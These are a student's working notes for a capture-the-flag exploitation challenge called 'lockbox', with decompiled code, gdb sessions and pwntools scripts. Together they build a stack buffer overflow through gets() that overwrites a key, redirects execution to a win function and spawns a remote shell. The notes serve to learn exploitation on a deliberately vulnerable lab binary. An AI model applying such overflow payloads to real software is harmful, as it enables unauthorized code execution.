Points: 200
Location: `nc offsec-chalbroker.osiris.cyber.nyu.edu 1336`
Download: `lockbox`
###### First Run:
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ ./lockbox  
I've locked my shell in a lockbox, you'll never get it now!

But give it your best try, what's the combination?
> 
1337
zsh: segmentation fault  ./lockbox

```
###### Ghidra:
```
undefined8 main(void)

{
  char guess [16];
  undefined8 *local_38;
  undefined8 local_30;
  
  FUN_004010c0(stdout,0,2,0);
  FUN_004010c0(stdin,0,2,0);
  fflush(stdout);
  puts("I\'ve locked my shell in a lockbox, you\'ll never get it now!\n");
  puts("But give it your best try, what\'s the combination?\n> ");
  gets(guess);
  *local_38 = local_30;
  return 0;
}
```
So it does use `gets` but I'm not sure how it uses the value. 
I'm not entirely sure about the function above it, it sets the buffer but I'm not sure how/why
```
void FUN_004010c0(FILE *param_1,char *param_2,int param_3,size_t param_4)
{
  setvbuf(param_1,param_2,param_3,param_4);
  return;
}
```

There's also this beautiful function called `win`:
```
void win(void)
{
  if (key == -0x25224f23) {
    mystring._0_8_ = 0x68732f6e69622f;
  }
  system(mystring);
  return;
}
```
but I don't think we ever call it.
That `key` value is a global set to contain `DEADBEEF`
![[Pasted image 20240225130354.png]]

So, to figure this out, I think we're going to need to
1) Overwrite `key` with `-0x25224f23`
2) Call `win` 
	* We can use the input to overwrite the `rip` pointer for when `main` returns (I think)

I think I want to play around with input and to see where my segfault is coming from
###### After segfault
```
But give it your best try, what's the combination?
> 
1337

Program received signal SIGSEGV, Segmentation fault.
0x00000000004012a4 in main ()
gdb) disas main
Dump of assembler code for function main:
   0x000000000040129a <+162>:   mov    (%rax),%rax
   0x000000000040129d <+165>:   mov    -0x10(%rbp),%rdx
   0x00000000004012a1 <+169>:   mov    (%rdx),%rdx
=> 0x00000000004012a4 <+172>:   mov    %rdx,(%rax)
   0x00000000004012a7 <+175>:   mov    $0x0,%eax
   0x00000000004012ac <+180>:   leave
   0x00000000004012ad <+181>:   ret
(gdb) info registers
rax            0x0                 0
rbx            0x7fffffffdf08      140737488346888
rcx            0x7ffff7f9eaa0      140737353738912
rdx            0x0                 0
rsi            0x7ffff7f9eb23      140737353739043
rdi            0x7ffff7fa0a40      140737353747008
rbp            0x7fffffffddf0      0x7fffffffddf0
rsp            0x7fffffffddb0      0x7fffffffddb0
rip            0x4012a4            0x4012a4 <main+172>
(gdb) p/x $rbp-0x10
$1 = 0x7fffffffdde0
(gdb) p/x *0x7fffffffdde0
$2 = 0xffffddc8
```
I'm not immediately seeing the issue
	`rip` is set to `0x4012a4` which is the (valid) location of the next line

*EDB* did give me more info about what memory it's trying to access
![[Pasted image 20240225131627.png]]
I guess `0x00000000004012a1` tries to move the data at the address stored in `RDX` into `RDX` when `RDX` is set to 0.
And then it would do the same thing with `RAX`
So what's setting those registers to 0?


# Debugging
### 1) 
Breakpoints:
`0x000000000040127e` 
	`lea    -0x40(%rbp),%rax`
	The operation after `gets` returns
`0x000000000040128e`
	`add    $0x18,%rax`
`0x0000000000401296`
	`mov    -0x8(%rbp),%rax`
`0x000000000040129a`
	`mov    (%rax),%rax`
`0x000000000040129d`
	`mov    -0x10(%rbp),%rdx`
`0x00000000004012a1`
	`mov    (%rdx),%rdx`
	This is where we got our segfault
###### Results:
```
Breakpoint 2,
{'rax': '0x7fffffffddb0', 'rdx': '0x0'}
{'rax': '0x7fffffffddb0', 'rdx': '0x0'}
Breakpoint 4,
{'rax': '0x7fffffffddc8', 'rdx': '0x0'}
Breakpoint 5,
{'rax': '0x7fffffffddc0', 'rdx': '0x0'}
Breakpoint 6,
{'rax': '0x0', 'rdx': '0x0'}
Breakpoint 7,
{'rax': '0x0', 'rdx': '0x7fffffffddc8'}

```

So when is `RDX` set?


Hmm, coding is being weird, I'm gonna see if I can just figure out where my input is going first
I think it's just chilling in the stack all split up?
```I've locked my shell in a lockbox, you'll never get it now!

But give it your best try, what's the combination?
> 
1337

Breakpoint 2, 0x000000000040127e in main ()
(gdb) info registers
rax            0x7fffffffddb0      140737488346544
rbx            0x7fffffffdf08      140737488346888
rcx            0x7ffff7f9eaa0      140737353738912
rdx            0x0                 0
rsi            0x7ffff7f9eb23      140737353739043
rdi            0x7ffff7fa0a40      140737353747008
rbp            0x7fffffffddf0      0x7fffffffddf0
rsp            0x7fffffffddb0      0x7fffffffddb0
rip            0x40127e            0x40127e <main+134>

(gdb) x/20x $sp
0x7fffffffddb0: 0x37333331      0x00000000      0x00000000      0x00000000
0x7fffffffddc0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffddd0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdde0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffddf0: 0x00000001      0x00000000      0xf7df26ca      0x00007fff

```
Yep
```
But give it your best try, what's the combination?
> 
AAAAA

Breakpoint 1, 0x000000000040127e in main ()
(gdb) info registers
rax            0x7fffffffddb0      140737488346544
rbx            0x7fffffffdf08      140737488346888
rcx            0x7ffff7f9eaa0      140737353738912
rdx            0x0                 0
rsi            0x7ffff7f9eb23      140737353739043
rdi            0x7ffff7fa0a40      140737353747008
rbp            0x7fffffffddf0      0x7fffffffddf0
rsp            0x7fffffffddb0      0x7fffffffddb0
rip            0x40127e            0x40127e <main+134>

(gdb) x/20x $sp
0x7fffffffddb0: 0x41414141      0x00000041      0x00000000      0x00000000
0x7fffffffddc0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffddd0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdde0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffddf0: 0x00000001      0x00000000      0xf7df26ca      0x00007fff
(gdb) 

```

So I want to assume that my goal is to overwrite the RDX register?

###### 55 A's
```
############################
# Now with 55 As           #
############################
Breakpoint 1, 0x000000000040127e in main ()
(gdb) 
0x7fffffffddb0:    0x41414141    0x41414141    0x41414141    0x41414141
0x7fffffffddc0:    0x41414141    0x41414141    0x41414141    0x41414141
0x7fffffffddd0:    0x41414141    0x41414141    0x41414141    0x41414141

0x7fffffffdde0:    0x41414141    0x00414141    0x00000000    0x00000000
0x7fffffffddf0:    0x00000001    0x00000000    0xf7df26ca    0x00007fff

```
So we're starting to overwrite the stack. My theory is, in approximately 5 words and 1 char from now, we'll begin to overwrite the stack word with `0xf7df26ca` which is probably passed to something


Looking at the stack right before `0x0000000000401296` where the command is	`mov    -0x8(%rbp),%rax`,
we can see that
	`$rbp-0x8` = `0x7fffffffdde8`
	And the value stored at address `0x7fffffffdde8` is `0xffffddc0`
The same data stored 3 words after where our A's end now
```
(gdb) x/20x $sp
0x7fffffffddb0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffddc0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffddd0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffdde0: 0xffffddc8      0x00007fff      0xffffddc0      0x00007fff
0x7fffffffddf0: 0x00000001      0x00000000      0xf7df26ca      0x00007fff
```

Hmmm, it seems after a certian point no amount of A's increases the number of 41's in the stack, but I don't see them bleeding into the registers or anything else
```
But give it your best try, what's the combination?
> 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x0000000000401296 in main ()
(gdb) x/20x $sp
0x7fffffffddb0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffddc0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffddd0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffdde0: 0xffffddc8      0x00007fff      0xffffddc0      0x00007fff
0x7fffffffddf0: 0x00000001      0x00000000      0xf7df26ca      0x00007fff
(gdb) info registers
rax            0x7fffffffddc8      140737488346568
rbx            0x7fffffffdf08      140737488346888
rcx            0x7ffff7f9eaa0      140737353738912
rdx            0x0                 0
rsi            0x7ffff7f9eb23      140737353739043
rdi            0x7ffff7fa0a40      140737353747008
rbp            0x7fffffffddf0      0x7fffffffddf0
rsp            0x7fffffffddb0      0x7fffffffddb0
r8             0x0                 0
r9             0x0                 0
r10            0x7ffff7dd8270      140737351877232
r11            0x246               582
r12            0x0                 0
r13            0x7fffffffdf18      140737488346904
r14            0x403e18            4210200
r15            0x7ffff7ffd000      140737354125312
rip            0x401296            0x401296 <main+158>
eflags         0x202               [ IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0

```


And we know it's supposed to be saved at RBP-40 I think

So right after the call, RAX gets the address of teh data
Then it adds 0x10 to that
Puts whatever is in rbp-8 into rax, and that is a value that can be overwritten
Then moves that data in RAX into rbp-40
adds 0x18 to RAX
puts the pointer to rbp-0x10 into rax (also another place on the stack that's overwritten)
Puts that in at rbp-8
Then ttries to move the data stored at the address RAX is pointing to into rax (which is the A's stored at rbp-0x10)
Then it tries to move the data in rbp-0x10 into rax. Right now that data is not all A's, despite it being that earlier (but rax ends up having all A's anyways)
Moves the data rdx points to (all A's) into rdx

Then tries to move the datain rdx to the address rax points to (but it's 41414141)
Segfault!


So, how many A's until RDX is overwritten later I wonder
I think it's only 4 more chars after the 16
At 16 it's just 0's


But what does this actually achieve? It's not calling this so I can't use it to run win

If I gave it the address of the key I guess I can at least see what happens


What does win look like?


Hmm, perhaps I can actually use a cool pwntools script
It looks like, by the crash at least, I'm not editing rip at all:
```python
def ripOffset():
	p = process('./lockbox')
	d = p.recvuntil(">")
	p.sendline(cyclic(500))
	p.wait()
	cf = p.corefile
	stack = cf.rsp
	info("rsp = %#x", stack)
	pattern = cf.read(stack, 4)
	rip_offset = cyclic_find(pattern)

	info("rip offset = %d", rip_offset)
```
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ python3 newdbg.py
[+] Starting local process './lockbox': pid 40543
/home/kali/Desktop/4-Week/newdbg.py:88: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  d = p.recvuntil(">")
[*] Process './lockbox' stopped with exit code -11 (SIGSEGV) (pid 40543)
[+] Parsing corefile...: Done
[*] '/home/kali/Desktop/4-Week/core.40543'
    Arch:      amd64-64-little
    RIP:       0x4012a4
    RSP:       0x7ffd68ab1df0
    Exe:       '/home/kali/Desktop/4-Week/lockbox' (0x400000)
[*] rsp = 0x7ffd68ab1df0
[*] rip offset = 0

```

But that will be useful for another one...almost makes me wish I was redoing boffin


Anyways, I guess I'm gonna see if I can put RAX to point to key for now just to move past the buffer overflow

Wit 16 A's + the address of key, I can exit without a segfault:
Breakpoint 1, 0x00000000004012a4 in main ()
(gdb) $ info registers
rax            0x404050            4210768


However, I am still nowhere near understanding what is up with RIP

Anything after those 16 chars starts to fill RAX and RDX


So I sent it
16 A's + `addr[key]` + 4 0's + 16 b's
After read in:
```
(gdb) $ x/20x $sp
0x7fffffffddb0:    0x41414141    0x41414141    0x41414141    0x41414141
0x7fffffffddc0:    0x00404050    0x00000000    0x42424242    0x42424242
0x7fffffffddd0:    0x42424242    0x42424242    0x00000000    0x00000000
0x7fffffffdde0:    0xffffddc8    0x00007fff    0xffffddc0    0x00007fff
0x7fffffffddf0:    0x00000001    0x00000000    0xf7df26ca    0x00007fff
rax            0x404050            4210768
rbx            0x7fffffffdf08      140737488346888
rcx            0x7ffff7f9eaa0      140737353738912
rdx            0x4242424242424242  4774451407313060418
```
Right before return:
```
(gdb) $ x/20x $sp
0x7fffffffddf8:    0xf7df26ca    0x00007fff    0x00000000    0x00000000
0x7fffffffde08:    0x004011f8    0x00000000    0x00000000    0x00000001
0x7fffffffde18:    0xffffdf08    0x00007fff    0xffffdf08    0x00007fff
0x7fffffffde28:    0xeac7f523    0xbdb47d53    0x00000000    0x00000000
0x7fffffffde38:    0xffffdf18    0x00007fff    0x00403e18    0x00000000
rax            0x0                 0
rbx            0x7fffffffdf08      140737488346888
rcx            0x7ffff7f9eaa0      140737353738912
rdx            0x4242424242424242  4774451407313060418
rsi            0x7ffff7f9eb23      140737353739043
rdi            0x7ffff7fa0a40      140737353747008
```

I wonder what would happen if I tried to overwrite that last stack data
I need 10 more words of data


So this time I sent it
16 A's + `addr[key]` + 4 0's + 56 b's
After `gets`
```
(gdb) $ x/80x $sp
0x7fffffffddb0:    0x41414141    0x41414141    0x41414141    0x41414141
0x7fffffffddc0:    0x00404050    0x00000000    0x42424242    0x42424242
0x7fffffffddd0:    0x42424242    0x42424242    0x42424242    0x42424242
0x7fffffffdde0:    0xffffddc8    0x00007fff    0xffffddc0    0x00007fff
0x7fffffffddf0:    0x42424242    0x42424242    0x42424242    0x42424242
0x7fffffffde00:    0x00000000    0x00000000    0x004011f8    0x00000000

```

Before return
```
Breakpoint 2, 0x00000000004012ad in main ()
(gdb) $ x/80x $sp
0x7fffffffddf8:    0x42424242    0x42424242    0x00000000    0x00000000
0x7fffffffde08:    0x004011f8    0x00000000    0x00000000    0x00000001
(gdb) $ c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00000000004012ad in main ()

```

And yay, segfault!. So I think it might be trying to call whatever is there after main returns?


So let's put an address in there:
16 A's + `addr[key]` + 4 0's + 48 b's + `addr[win]`

Win starts at `0x00000000004011b6`


Weird, I sent
16 A's + `addr[key]` + 4 0's + 48 b's + `addr[win]`  + 4 0's

It looks like it did try to jump, but I'm not entirely sure how

Right before return
```
rip            0x4012ad
gdb) $ x/80x $sp
0x7fffffffddf8:    0xf7000000    0x00007fff    0x00000000    0x00000000
0x7fffffffde08:    0x004011f8    0x00000000    0x00000000    0x00000001
```
Right after segfault:
```
rip            0x7ffff7000000      0x7ffff7000000
(gdb) $ x/80x $sp
0x7fffffffde00:    0x00000000    0x00000000 
```


So It is taking in data from the stack, but I'm not sure why mine isn't there
Oh, I sent 42 b's


ACTUALLY 48 b's:
Right before return
```
rip            0x4012ad            0x4012ad <main+181>
(gdb) $ x/80x $sp
0x7fffffffddf8:    0x004011b6    0x00000000    0x00000000    0x00000000
0x7fffffffde08:    0x004011f8    0x00000000    0x00000000    0x00000001
```
After segfault:
```
rip            0x4011f7            0x4011f7 <win+65>
(gdb) $ x/80x $sp
0x7fffffffddf8:    0x42424242    0x42424242    0x00000000    0x00000000
0x7fffffffde08:    0x004011f8    0x00000000    0x00000000    0x00000001
```

Hmm, so those 42's got pushed on it almost seems


Maybe it's time for me to try my cool little script again

YAY Data
```python
def testPld():
	base = b"".join([struct.pack("B", 0x41) for i in range(0,16)])
	data = b"".join([struct.pack("B", 0x50), struct.pack("B", 0x40), struct.pack("B", 0x40), struct.pack("B", 0x00)])
	d2 = b"".join([struct.pack("B", 0x00) for i in range(0,4)])
	d3 = cyclic(500)
	return base + data + d2 + d3

def ripOffset():
	p = process('./lockbox')
	d = p.recvuntil(">")
	p.sendline(testPld())
	p.wait()
	cf = p.corefile
	stack = cf.rsp
	info("rsp = %#x", stack)
	pattern = cf.read(stack, 4)
	rip_offset = cyclic_find(pattern)

	info("rip offset = %d", rip_offset)
```

```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ python3 newdbg.py
[+] Starting local process './lockbox': pid 63811
/home/kali/Desktop/4-Week/newdbg.py:95: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  d = p.recvuntil(">")
[*] Process './lockbox' stopped with exit code -11 (SIGSEGV) (pid 63811)
[+] Parsing corefile...: Done
[*] '/home/kali/Desktop/4-Week/core.63811'
    Arch:      amd64-64-little
    RIP:       0x4012ad
    RSP:       0x7ffedf978de8
    Exe:       '/home/kali/Desktop/4-Week/lockbox' (0x400000)
    Fault:     0x6161616e6161616d
[*] rsp = 0x7ffedf978de8
[*] rip offset = 48
```
Hmmm, it looks like `rip` never changed but the fault did happen at a specific offset?

So I think what it's saying is, wait so I was right about the 48?
16 A's + `addr[key]` + 4 0's + 48 b's + `addr[win]`  + 4 0's
```
└─$ python3 newdbg.py
[+] Starting local process './lockbox': pid 65599
/home/kali/Desktop/4-Week/newdbg.py:95: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  d = p.recvuntil(">")
[*] Process './lockbox' stopped with exit code -11 (SIGSEGV) (pid 65599)
[+] Parsing corefile...: Done
[*] '/home/kali/Desktop/4-Week/core.65599'
    Arch:      amd64-64-little
    RIP:       0x4011f7
    RSP:       0x7ffc6b467de8
    Exe:       '/home/kali/Desktop/4-Week/lockbox' (0x400000)
    Fault:     0x4242424242424242
[*] rsp = 0x7ffc6b467de8

```

So maybe it's still those last few b's?

Okay, I did it with 48, the fault at `0x00000000004011f7 in win ()` which I can't complain about
That's at the return condition.

Hmm, so key is stored here: `0x2e82(%rip)` before it's moved into `eax`
I wonder if jumping to `win` like that is going to mess with that

```
break *0x00000000004011c8 //The move
break *0x00000000004011ce //The compare
```


So after the mov, somehow `eax` is full of B's

I think I can use my pattern matching here too!
It is the first part of the payload:
```python
def keyPld():
	base = b"".join([struct.pack("B", 0x41) for i in range(0,16)])
	data = b"".join([struct.pack("B", 0x50), struct.pack("B", 0x40), struct.pack("B", 0x40), struct.pack("B", 0x00)])
	pad0 = b"".join([struct.pack("B", 0x00) for i in range(0,4)])
	pad48 = cyclic(48)
	win = b"".join([struct.pack("B", 0xb6), struct.pack("B", 0x11), struct.pack("B", 0x40), struct.pack("B", 0x00)])
	return base + data + pad0 + pad48 + win + pad0

def keyOffset():
	p =  process('/bin/bash')
	p.sendline('gdb ./lockbox -q')
	p.sendline("break *0x00000000004011ce")
	p.sendline("r")
	d = p.recvuntil(">")
	pld = keyPld()
	print(pld)
	p.sendline(pld)
	p.recvuntil("Breakpoint")
	p.recvuntil("(gdb) ")
	p.sendline("info registers eax")
	#p.recv()
	#p.recv(timeout=0.05)
	ln = cleanLine(p.recv())
	print(ln)
	l = re.split("\s+", ln)
	d = re.split("x", l[1])
	n = 2
	a = d[1]
	byt = [a[i:i+n] for i in range(0, len(a), n)]
	#print(byt)
	bytes = b"".join(struct.pack("B", int("0x"+byt[i], 16)) for i in range(0,4))
	print(str(bytes))
	#print("eax = " + d[1])
	eax = bytes
	eOffset = cyclic_find(eax)
	info("eax offset = %d", eOffset)
	p.close()
```
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ python3 newdbg.py
[+] Starting local process '/bin/bash': pid 90949
b'AAAAAAAAAAAAAAAAP@@\x00\x00\x00\x00\x00aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa\xb6\x11@\x00\x00\x00\x00\x00'

eax            0x61616161          1633771873
(gdb) 
b'aaaa'
[*] eax offset = 0
[*] Stopped process '/bin/bash' (pid 90949)
```

So, I think if we put our data after the 0s...that should be read in for the compare?

I think this got us a valid eax value...but I think I also have to overwrite `mystring`
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ python3 newdbg.py
(gdb) $ info register eax
eax            0x25224f23          623005475
Program received signal SIGSEGV, Segmentation fault.
0x00000000004011f7 in win ()
(gdb) $ disas win
Dump of assembler code for function win:
   0x00000000004011b6 <+0>:    endbr64
   0x00000000004011ba <+4>:    push   %rbp
   0x00000000004011bb <+5>:    mov    %rsp,%rbp
   0x00000000004011be <+8>:    mov    $0xfffffffffffffff0,%rax
   0x00000000004011c5 <+15>:    and    %rax,%rsp
   0x00000000004011c8 <+18>:    mov    0x2e82(%rip),%eax        # 0x404050 <key>
   0x00000000004011ce <+24>:    cmp    $0xdaddb0dd,%eax
   0x00000000004011d3 <+29>:    jne    0x4011e6 <win+48>
   0x00000000004011d5 <+31>:    movabs $0x68732f6e69622f,%rax
   0x00000000004011df <+41>:    mov    %rax,0x2e7a(%rip)        # 0x404060 <mystring>
   0x00000000004011e6 <+48>:    lea    0x2e73(%rip),%rax        # 0x404060 <mystring>
   0x00000000004011ed <+55>:    mov    %rax,%rdi
   0x00000000004011f0 <+58>:    call   0x401090 <system@plt>
   0x00000000004011f5 <+63>:    nop
   0x00000000004011f6 <+64>:    pop    %rbp
=> 0x00000000004011f7 <+65>:    ret
End of assembler dump.
```

So it seems like the next thing to tackle will be overwriting `mystring`

Wait, I'm a dumbass...I ovwewrote `eax` with the tricky negative value
Ghidra:
```c

void win(void)
{
  if (key == -0x25224f23) {
    mystring._0_8_ = 0x68732f6e69622f;
  }
  system(mystring);
  return;
}
```
But in assembly, it's ACTUALLY comparing the value to `$0xdaddb0dd`
So let me fix my script to reflect that


So I think I need to overwrite RAX before `0x00000000004011f0 <+58>:    call   0x401090 <system@plt>`
How was I able to ovwewrite eax if I can't ovwewrite rax?
I did legitimately overwrite that location where the key is stored. I feel like I should be able to overwrite the other location too
```
(gdb) $ p/x *0x404050
$4 = 0xdaddb0dd
(gdb) $ p/x *0x404060
$5 = 0x74697865

```
I almost wonder if it doesn't matter because that part gets overwritten
```
Breakpoint 3, 0x00000000004011f0 in win ()
(gdb) $ p/x *0x404060
$3 = 0x6e69622f
```

Gonna look at the stack for `system` and see if I can overwrite
```
Dump of assembler code for function __libc_system:
   0x00007ffff7e17920 <+0>:    test   %rdi,%rdi
   0x00007ffff7e17923 <+3>:    je     0x7ffff7e17930 <__libc_system+16>
   0x00007ffff7e17925 <+5>:    jmp    0x7ffff7e174b0 <do_system>
   0x00007ffff7e1792a <+10>:    nopw   0x0(%rax,%rax,1)
   0x00007ffff7e17930 <+16>:    sub    $0x8,%rsp
   0x00007ffff7e17934 <+20>:    lea    0x14971c(%rip),%rdi        # 0x7ffff7f61057
   0x00007ffff7e1793b <+27>:    call   0x7ffff7e174b0 <do_system>
   0x00007ffff7e17940 <+32>:    test   %eax,%eax
   0x00007ffff7e17942 <+34>:    sete   %al
   0x00007ffff7e17945 <+37>:    add    $0x8,%rsp
   0x00007ffff7e17949 <+41>:    movzbl %al,%eax
   0x00007ffff7e1794c <+44>:    ret
```

So I think, ultimately, this is the line I need to overwrite: `0x7ffff7e174b0` (wait no, that's the address of the do call)
Here's what it looks like right before that call:
```
Breakpoint 5, do_system (line=0x404060 <mystring> "/bin/sh")
    at ../sysdeps/posix/system.c:102
102    in ../sysdeps/posix/system.c
(gdb) $ info registers
rax            0x404060            4210784
rbx            0x7fffffffdf08      140737488346888
rip            0x7ffff7e174b0      0x7ffff7e174b0 <do_system>
--Type <RET> for more, q to quit, c to continue without paging--$ c
gs             0x0                 0
(gdb) $ x/20x $sp
0x7fffffffdde8:    0x004011f5    0x00000000    0x61616169    0x6161616a
0x7fffffffddf8:    0x61616169    0x6161616a    0x61616161    0x61616162
0x7fffffffde08:    0x61616163    0x61616164    0x61616165    0x61616166
0x7fffffffde18:    0x61616167    0x61616168    0x61616169    0x6161616a
0x7fffffffde28:    0x6161616b    0x6161616c    0x0000616d    0x00000000
```

It looks like the data in between the two spots is all 0's...I bet that's my padding?
```
Breakpoint 1, 0x00000000004011f0 in win ()
(gdb) $ p/x *0x404050
$1 = 0xdaddb0dd
(gdb) $ p/x *0x404051
$2 = 0xdaddb0
(gdb) $ p/x *0x404052
$3 = 0xdadd
(gdb) $ p/x *0x404053
$4 = 0xda
(gdb) $ p/x *0x404054
$5 = 0x0
(gdb) $ p/x *0x404055
$6 = 0x0
(gdb) $ p/x *0x404056
$7 = 0x0
(gdb) $ p/x *0x404057
$8 = 0x0
(gdb) $ p/x *0x404058
$9 = 0x0
(gdb) $ p/x *0x404059
$10 = 0x0
(gdb) $ p/x *0x404060
$11 = 0x6e69622f

```
Yeah, when I filled that with padding that's what was there
```
(gdb) $ p/x *0x404050
$1 = 0xdaddb0dd
(gdb) $ p/x *0x404054
$2 = 0x61616161
(gdb) $ p/x *0x404059
$3 = 0x0
(gdb) $ p/x *0x404060
$4 = 0x6e69622f
```

What's weird though is, I don't know if anything after that can be saved
I read in 44 bytes of generated data instead of the 0's, and it doesn't seem to be taking:
```
(gdb) $ p/x *0x404054
$1 = 0x61616161
(gdb) $ p/x *0x404058
$2 = 0x0
(gdb) $ p/x *0x404059
$3 = 0x0
(gdb) $ p/x *0x40460
Cannot access memory at address 0x40460
(gdb) $ p/x *0x404060
$4 = 0x6e69622f
```
It looks like at least some of that is in the stack:
```
(gdb) $ x/20x $sp
0x7fffffffddf0:    0x6161616a    0x6161616b    0x6161616a    0x6161616b
0x7fffffffde00:    0x00000000    0x00000000    0x004011f8    0x00000000
```
And anything after the win and padding is pushed onto the stack too:
```
(gdb) $ x/20x $sp
0x7fffffffddf0:    0x6161616a    0x6161616b    0x6161616a    0x6161616b
0x7fffffffde00:    0x61616161    0x61616162    0x61616163    0x61616164
0x7fffffffde10:    0x61616165    0x61616166    0x61616167    0x61616168
0x7fffffffde20:    0x61616169    0x6161616a    0x6161616b    0x6161616c
0x7fffffffde30:    0x6161616d    0x6161616e    0x6161616f    0x61616170
```


Or maybe I'm thinking of this all wrong. Maybe I need it 


OHHH, eventually, the segfault is caused when RBP is overwritten. ot's overwritten by the 44 char padding between secret and win when the payload is long enough (overwhelm >= 282)

```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ python3 newdbg.py
rbp            0x6161616b6161616a  0x6161616b6161616a
(gdb) 
[*] rbp offset = 37
[*] Stopped process '/bin/bash' (pid 141325)
```

So what happens if I set `rbp` to a reasonable value like `0x7fffffffde38`?
`0x7f ff ff ff de 38`

testpad = 36
`rbp            0x11b67fffffffde38`
I think we're gonna want some 0's before that

Oh okay, it's gonna go to the address at RBP when it returns....
can I just try to pass it "system" again or something like that?
```
Breakpoint 1, 0x00000000004011f7 in win ()
(gdb) $ info registers
rax            0x7f00              32512
rbx            0x7fffffffdf08      140737488346888
rbp            0x7fffffffde38      0x7fffffffde38
rsp            0x7fffffffddf8      0x7fffffffddf8
rip            0x4011f7            0x4011f7 <win+65>
(gdb) $ x/20x $sp
0x7fffffffddf8:    0xffffde38    0x00007fff    0x61616161    0x61616162
0x7fffffffde08:    0x61616163    0x61616164    0x61616165    0x61616166
0x7fffffffde18:    0x61616167    0x61616168    0x61616169    0x6161616a
0x7fffffffde28:    0x6161616b    0x6161616c    0x6161616d    0x6161616e
0x7fffffffde38:    0x6161616f    0x61616170    0x61616171    0x61616172
(gdb) $ c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffde38 in ?? ()
gdb) $ info registers
rax            0x7f00              32512
rbx            0x7fffffffdf08      140737488346888
rbp            0x7fffffffde38      0x7fffffffde38
rsp            0x7fffffffde00      0x7fffffffde00
rip            0x7fffffffde38      0x7fffffffde38
(gdb) $ x/20x $sp
0x7fffffffde00:    0x61616161    0x61616162    0x61616163    0x61616164
0x7fffffffde10:    0x61616165    0x61616166    0x61616167    0x61616168
0x7fffffffde20:    0x61616169    0x6161616a    0x6161616b    0x6161616c
0x7fffffffde30:    0x6161616d    0x6161616e    0x6161616f    0x61616170
0x7fffffffde40:    0x61616171    0x61616172    0x61616173    0x61616174

```

So okay, let me put the address of
Okay, fuck me, the ascii text of `mystring` is `/bin/sh`
So I think if I ran it without GDB it might work


Oh fuck me yeah, this is the same shit as last time where it wasn't running remotely. IDK if I eben needed to poiunt that to a valid thing
```
┌──(kali㉿kali)-[~/Desktop/4-Week]
└─$ python3 newdbg.py
[+] Opening connection to offsec-chalbroker.osiris.cyber.nyu.edu on port 1336: Done
/home/kali/Desktop/4-Week/newdbg.py:215: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  d = p.recvuntil(">")
[*] Switching to interactive mode
 
$ ls
flag.txt
lockbox
$ cat flag.txt
flag{Wh0_n33d5_A_k33y_wen_U_h4v3_a_B0F}
$  

```

I guess I did, yay